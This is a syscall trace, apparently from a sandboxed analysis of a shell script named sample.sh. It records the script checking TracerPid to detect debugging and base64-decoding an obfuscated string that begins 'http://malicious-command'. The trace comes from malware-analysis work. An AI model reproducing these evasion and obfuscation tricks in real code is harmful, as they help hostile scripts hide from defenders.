11    14:56:48.786778 munmap(0x75e1b1e8f000, 8192) = 0
11    14:56:48.787259 sigaltstack({ss_sp=0x56c9e0ad97c0, ss_flags=0, ss_size=65536}, NULL) = 0
11    14:56:48.787725 rt_sigaction(SIGSEGV, {sa_handler=0x56c9e0ad0990, sa_mask=[HUP INT QUIT USR1 USR2 PIPE ALRM TERM CHLD URG XCPU XFSZ VTALRM PROF WINCH IO PWR], sa_flags=SA_RESTORER|SA_ONSTACK|SA_SIGINFO, sa_restorer=0x75e1b1c28330}, NULL, 8) = 0
11    14:56:48.788145 rt_sigaction(SIGSEGV, {sa_handler=0x56c9e0ad0990, sa_mask=[HUP INT QUIT USR1 USR2 PIPE ALRM TERM CHLD URG XCPU XFSZ VTALRM PROF WINCH IO PWR], sa_flags=SA_RESTORER|SA_ONSTACK|SA_SIGINFO, sa_restorer=0x75e1b1c28330}, NULL, 8) = 0
11    14:56:48.788613 fstat(1<pipe:[574]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
11    14:56:48.789190 openat(AT_FDCWD</sandbox>, "/proc/self/status", O_RDONLY|O_NOCTTY) = 3</proc/11/status>
11    14:56:48.789702 fstat(3</proc/11/status>, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
11    14:56:48.790861 read(3</proc/11/status>, "Name:\tgrep\nUmask:\t0022\nState:\tR "..., 98304) = 1432
11    14:56:48.792404 fstat(1<pipe:[574]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
11    14:56:48.793115 read(3</proc/11/status>, "", 94208) = 0
11    14:56:48.793635 close(3</proc/11/status>) = 0
11    14:56:48.794197 write(1<pipe:[574]>, "TracerPid:\t0\n", 13) = 13
12    14:56:48.794657 <... read resumed>"TracerPid:\t0\n", 262144) = 13
11    14:56:48.794850 close(1<pipe:[574]> <unfinished ...>
12    14:56:48.795037 read(0<pipe:[574]>,  <unfinished ...>
11    14:56:48.795200 <... close resumed>) = 0
12    14:56:48.795382 <... read resumed>"", 262131) = 0
11    14:56:48.795572 close(2<pipe:[2810]> <unfinished ...>
12    14:56:48.795822 fstat(1<pipe:[570]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
11    14:56:48.796269 <... close resumed>) = 0
12    14:56:48.796476 munmap(0x7e1bbb57e000, 266240 <unfinished ...>
11    14:56:48.796687 exit_group(0 <unfinished ...>
12    14:56:48.796862 <... munmap resumed>) = 0
11    14:56:48.797041 <... exit_group resumed>) = ?
12    14:56:48.797210 write(1<pipe:[570]>, "0\n", 2 <unfinished ...>
9     14:56:48.797450 <... read resumed>"0\n", 4096) = 2
12    14:56:48.798236 <... write resumed>) = 2
9     14:56:48.798420 read(3<pipe:[570]>,  <unfinished ...>
11    14:56:48.798615 +++ exited with 0 +++
12    14:56:48.798794 close(1<pipe:[570]> <unfinished ...>
10    14:56:48.799005 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 11
12    14:56:48.799196 <... close resumed>) = 0
10    14:56:48.799398 wait4(-1,  <unfinished ...>
12    14:56:48.799570 close(2<pipe:[2810]>) = 0
12    14:56:48.800050 exit_group(0)     = ?
12    14:56:48.801001 +++ exited with 0 +++
10    14:56:48.801234 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 12
10    14:56:48.801519 rt_sigaction(SIGINT, {sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b146750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
10    14:56:48.802017 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
10    14:56:48.802478 close(3)          = -1 EBADF (Bad file descriptor)
10    14:56:48.802940 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10    14:56:48.803335 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=11, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
10    14:56:48.803552 wait4(-1, 0x7ffd8d3b0010, WNOHANG, NULL) = -1 ECHILD (No child processes)
10    14:56:48.803946 rt_sigreturn({mask=[]}) = 0
10    14:56:48.804463 exit_group(0)     = ?
9     14:56:48.805076 <... read resumed>"", 4096) = 0
10    14:56:48.805250 +++ exited with 0 +++
9     14:56:48.805409 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=10, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
9     14:56:48.805625 wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], WNOHANG, NULL) = 10
9     14:56:48.806083 wait4(-1, 0x7ffd8d3af350, WNOHANG, NULL) = -1 ECHILD (No child processes)
9     14:56:48.806617 rt_sigreturn({mask=[INT]}) = 0
9     14:56:48.807106 close(3<pipe:[570]>) = 0
9     14:56:48.807616 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:48.808086 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9     14:56:48.808561 rt_sigaction(SIGINT, {sa_handler=0x5efc1b146750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.808994 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b146750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.809361 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:48.809804 read(255</sandbox/sample.sh>, "# --- Obfuscated strings (base64"..., 1423) = 1209
9     14:56:48.810602 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:48.810984 pipe2([3<pipe:[4593]>, 4<pipe:[4593]>], 0) = 0
9     14:56:48.811381 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9     14:56:48.811777 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:48.812160 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:48.812540 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     14:56:48.812939 lseek(255</sandbox/sample.sh>, -992, SEEK_CUR) = 431
9     14:56:48.813339 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7694e368ce50) = 13
9     14:56:48.814059 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
13    14:56:48.814247 set_robust_list(0x7694e368ce60, 24 <unfinished ...>
9     14:56:48.814412 <... rt_sigprocmask resumed>NULL, 8) = 0
13    14:56:48.814602 <... set_robust_list resumed>) = 0
9     14:56:48.814812 rt_sigaction(SIGCHLD, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330},  <unfinished ...>
13    14:56:48.814992 getpid( <unfinished ...>
9     14:56:48.815169 <... rt_sigaction resumed>{sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
13    14:56:48.815375 <... getpid resumed>) = 13
9     14:56:48.815543 close(4<pipe:[4593]> <unfinished ...>
13    14:56:48.815737 close(255</sandbox/sample.sh> <unfinished ...>
9     14:56:48.815950 <... close resumed>) = 0
13    14:56:48.816143 <... close resumed>) = 0
9     14:56:48.816328 rt_sigprocmask(SIG_BLOCK, [INT],  <unfinished ...>
13    14:56:48.816501 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     14:56:48.816660 <... rt_sigprocmask resumed>[], 8) = 0
13    14:56:48.816824 <... rt_sigprocmask resumed>NULL, 8) = 0
9     14:56:48.817011 read(3<pipe:[4593]>,  <unfinished ...>
13    14:56:48.817178 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
13    14:56:48.817584 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
13    14:56:48.817975 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
13    14:56:48.818361 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
13    14:56:48.818813 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
13    14:56:48.819201 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
13    14:56:48.819561 rt_sigaction(SIGCHLD, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
13    14:56:48.819905 rt_sigaction(SIGINT, {sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
13    14:56:48.820285 dup2(4<pipe:[4593]>, 1<pipe:[2809]>) = 1<pipe:[4593]>
13    14:56:48.820663 close(4<pipe:[4593]>) = 0
13    14:56:48.821001 close(3<pipe:[4593]>) = 0
13    14:56:48.821419 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
13    14:56:48.821863 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
13    14:56:48.822221 fcntl(0</dev/null>, F_GETFD) = 0
13    14:56:48.822588 pipe2([3<pipe:[579]>, 4<pipe:[579]>], 0) = 0
13    14:56:48.823023 rt_sigprocmask(SIG_BLOCK, NULL, [CHLD], 8) = 0
13    14:56:48.823589 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [CHLD], 8) = 0
13    14:56:48.824066 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7694e368ce50) = 14
14    14:56:48.824856 set_robust_list(0x7694e368ce60, 24 <unfinished ...>
13    14:56:48.825050 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
14    14:56:48.825434 <... set_robust_list resumed>) = 0
13    14:56:48.825626 <... rt_sigprocmask resumed>NULL, 8) = 0
14    14:56:48.825806 getpid( <unfinished ...>
13    14:56:48.825979 close(4<pipe:[579]> <unfinished ...>
14    14:56:48.826179 <... getpid resumed>) = 14
13    14:56:48.826350 <... close resumed>) = 0
14    14:56:48.826532 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
13    14:56:48.826768 close(4 <unfinished ...>
14    14:56:48.826994 <... rt_sigprocmask resumed>NULL, 8) = 0
13    14:56:48.827178 <... close resumed>) = -1 EBADF (Bad file descriptor)
14    14:56:48.827349 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
13    14:56:48.827529 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
14    14:56:48.827669 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
13    14:56:48.827845 <... rt_sigprocmask resumed>[CHLD], 8) = 0
14    14:56:48.827991 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
13    14:56:48.828135 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD],  <unfinished ...>
14    14:56:48.828270 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
13    14:56:48.828431 <... rt_sigprocmask resumed>[CHLD], 8) = 0
14    14:56:48.828598 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
13    14:56:48.828742 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD <unfinished ...>
14    14:56:48.828893 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
14    14:56:48.829073 close(3<pipe:[579]>) = 0
15    14:56:48.829410 set_robust_list(0x7694e368ce60, 24 <unfinished ...>
13    14:56:48.829554 <... clone resumed>, child_tidptr=0x7694e368ce50) = 15
15    14:56:48.829712 <... set_robust_list resumed>) = 0
14    14:56:48.829854 dup2(4<pipe:[579]>, 1<pipe:[4593]> <unfinished ...>
15    14:56:48.830014 getpid( <unfinished ...>
13    14:56:48.830160 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
15    14:56:48.830309 <... getpid resumed>) = 15
14    14:56:48.830456 <... dup2 resumed>) = 1<pipe:[579]>
15    14:56:48.830667 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
13    14:56:48.830855 <... rt_sigprocmask resumed>NULL, 8) = 0
15    14:56:48.831027 <... rt_sigprocmask resumed>NULL, 8) = 0
14    14:56:48.831195 close(4<pipe:[579]> <unfinished ...>
15    14:56:48.831376 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
13    14:56:48.831552 close(3<pipe:[579]> <unfinished ...>
15    14:56:48.831719 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
14    14:56:48.831931 <... close resumed>) = 0
15    14:56:48.832108 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
13    14:56:48.832280 <... close resumed>) = 0
15    14:56:48.832443 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
14    14:56:48.832606 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
15    14:56:48.832776 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
13    14:56:48.832940 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
15    14:56:48.833111 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
14    14:56:48.833281 <... rt_sigaction resumed>{sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
15    14:56:48.833444 dup2(3<pipe:[579]>, 0</dev/null> <unfinished ...>
13    14:56:48.833634 <... rt_sigprocmask resumed>[CHLD], 8) = 0
15    14:56:48.833811 <... dup2 resumed>) = 0<pipe:[579]>
14    14:56:48.833986 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
15    14:56:48.834144 close(3<pipe:[579]> <unfinished ...>
13    14:56:48.834309 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
15    14:56:48.834475 <... close resumed>) = 0
14    14:56:48.834664 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
15    14:56:48.834832 newfstatat(AT_FDCWD</sandbox>, ".",  <unfinished ...>
13    14:56:48.835002 <... rt_sigprocmask resumed>NULL, 8) = 0
15    14:56:48.835150 <... newfstatat resumed>{st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
14    14:56:48.835303 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330},  <unfinished ...>
15    14:56:48.835458 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/base64",  <unfinished ...>
13    14:56:48.835613 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
15    14:56:48.835768 <... newfstatat resumed>0x7ffd8d3b0350, 0) = -1 ENOENT (No such file or directory)
14    14:56:48.835914 <... rt_sigaction resumed>{sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
15    14:56:48.836067 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/base64",  <unfinished ...>
13    14:56:48.836222 <... rt_sigprocmask resumed>[CHLD], 8) = 0
15    14:56:48.836374 <... newfstatat resumed>0x7ffd8d3b0350, 0) = -1 ENOENT (No such file or directory)
14    14:56:48.836528 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
15    14:56:48.836726 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/base64",  <unfinished ...>
13    14:56:48.836914 rt_sigaction(SIGINT, {sa_handler=0x5efc1b146750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
15    14:56:48.837077 <... newfstatat resumed>0x7ffd8d3b0350, 0) = -1 ENOENT (No such file or directory)
14    14:56:48.837221 <... rt_sigprocmask resumed>[], 8) = 0
15    14:56:48.837372 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/base64",  <unfinished ...>
13    14:56:48.837528 <... rt_sigaction resumed>{sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
15    14:56:48.837682 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=39432, ...}, 0) = 0
14    14:56:48.837832 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
15    14:56:48.837983 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/base64",  <unfinished ...>
13    14:56:48.838136 wait4(-1,  <unfinished ...>
15    14:56:48.838282 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=39432, ...}, 0) = 0
14    14:56:48.838429 <... rt_sigprocmask resumed>NULL, 8) = 0
15    14:56:48.838670 geteuid( <unfinished ...>
14    14:56:48.838842 ioctl(2<pipe:[2810]>, TIOCGPGRP <unfinished ...>
15    14:56:48.839023 <... geteuid resumed>) = 1001
14    14:56:48.839164 <... ioctl resumed>, 0x7ffd8d3b0624) = -1 ENOTTY (Inappropriate ioctl for device)
15    14:56:48.839313 getegid( <unfinished ...>
14    14:56:48.839458 rt_sigaction(SIGCHLD, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330},  <unfinished ...>
15    14:56:48.839637 <... getegid resumed>) = 1001
14    14:56:48.839822 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
15    14:56:48.840061 getuid( <unfinished ...>
14    14:56:48.840245 rt_sigaction(SIGINT, {sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
15    14:56:48.840434 <... getuid resumed>) = 1001
14    14:56:48.840628 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
15    14:56:48.840868 getgid( <unfinished ...>
14    14:56:48.841061 fstat(1<pipe:[579]>,  <unfinished ...>
15    14:56:48.841244 <... getgid resumed>) = 1001
14    14:56:48.841401 <... fstat resumed>{st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
15    14:56:48.841585 access("/usr/bin/base64", X_OK <unfinished ...>
14    14:56:48.841787 write(1<pipe:[579]>, "aHR0cDovL21hbGljaW91cy1jb21tYW5k"..., 85 <unfinished ...>
15    14:56:48.841960 <... access resumed>) = 0
14    14:56:48.842111 <... write resumed>) = 85
15    14:56:48.842261 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/base64",  <unfinished ...>
14    14:56:48.842429 exit_group(0 <unfinished ...>
15    14:56:48.842647 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=39432, ...}, 0) = 0
14    14:56:48.842851 <... exit_group resumed>) = ?
15    14:56:48.843026 geteuid( <unfinished ...>
14    14:56:48.843667 +++ exited with 0 +++
15    14:56:48.843873 <... geteuid resumed>) = 1001
13    14:56:48.844067 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 14
15    14:56:48.844286 getegid( <unfinished ...>
13    14:56:48.844476 wait4(-1,  <unfinished ...>
15    14:56:48.844636 <... getegid resumed>) = 1001
15    14:56:48.844842 getuid()          = 1001
15    14:56:48.845201 getgid()          = 1001
15    14:56:48.845586 access("/usr/bin/base64", R_OK) = 0
15    14:56:48.846049 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
15    14:56:48.846438 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
15    14:56:48.846844 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
15    14:56:48.847227 execve("/usr/bin/base64", ["base64", "-d"], 0x5efc23a6e620 /* 9 vars */) = 0
15    14:56:48.848091 brk(NULL)         = 0x5835024ef000
15    14:56:48.848542 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x744b841c7000
15    14:56:48.848919 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
15    14:56:48.849639 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
15    14:56:48.850166 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0777, st_size=16376, ...}) = 0
15    14:56:48.850708 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x744b841c2000
15    14:56:48.851054 mmap(0x744b841c3000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x744b841c3000
15    14:56:48.851409 mmap(0x744b841c4000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x744b841c4000
15    14:56:48.851768 mmap(0x744b841c5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x744b841c5000
15    14:56:48.852128 close(3</usr/lib/libfake_tracer.so>) = 0
15    14:56:48.852470 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
15    14:56:48.852808 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
15    14:56:48.853163 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
15    14:56:48.853500 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x744b841c0000
15    14:56:48.853838 close(3</etc/ld.so.cache>) = 0
15    14:56:48.854211 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
15    14:56:48.854633 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
15    14:56:48.855015 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
15    14:56:48.855353 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
15    14:56:48.855691 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
15    14:56:48.856054 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x744b83fae000
15    14:56:48.856473 mmap(0x744b83fd6000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x744b83fd6000
15    14:56:48.857170 mmap(0x744b8415e000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x744b8415e000
15    14:56:48.857709 mmap(0x744b841ad000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x744b841ad000
15    14:56:48.858201 mmap(0x744b841b3000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x744b841b3000
15    14:56:48.858716 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
15    14:56:48.859145 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x744b83fab000
15    14:56:48.859631 arch_prctl(ARCH_SET_FS, 0x744b83fab740) = 0
15    14:56:48.860091 set_tid_address(0x744b83faba10) = 15
15    14:56:48.860470 set_robust_list(0x744b83faba20, 24) = 0
15    14:56:48.860866 rseq(0x744b83fac060, 0x20, 0, 0x53053053) = 0
15    14:56:48.861382 mprotect(0x744b841ad000, 16384, PROT_READ) = 0
15    14:56:48.861887 mprotect(0x744b841c5000, 4096, PROT_READ) = 0
15    14:56:48.862394 mprotect(0x5834d2518000, 4096, PROT_READ) = 0
15    14:56:48.862902 mprotect(0x744b841ff000, 8192, PROT_READ) = 0
15    14:56:48.863458 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
15    14:56:48.863920 munmap(0x744b841c0000, 7295) = 0
15    14:56:48.864520 getrandom("\x69\x71\x1a\x8c\x0b\x6b\x8f\xf8", 8, GRND_NONBLOCK) = 8
15    14:56:48.864953 brk(NULL)         = 0x5835024ef000
15    14:56:48.865371 brk(0x583502510000) = 0x583502510000
15    14:56:48.865827 fadvise64(0<pipe:[579]>, 0, 0, POSIX_FADV_SEQUENTIAL) = -1 ESPIPE (Illegal seek)
15    14:56:48.866357 fstat(0<pipe:[579]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
15    14:56:48.866889 read(0<pipe:[579]>, "aHR0cDovL21hbGljaW91cy1jb21tYW5k"..., 4096) = 85
15    14:56:48.867369 read(0<pipe:[579]>, "", 4096) = 0
15    14:56:48.867798 fstat(1<pipe:[4593]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
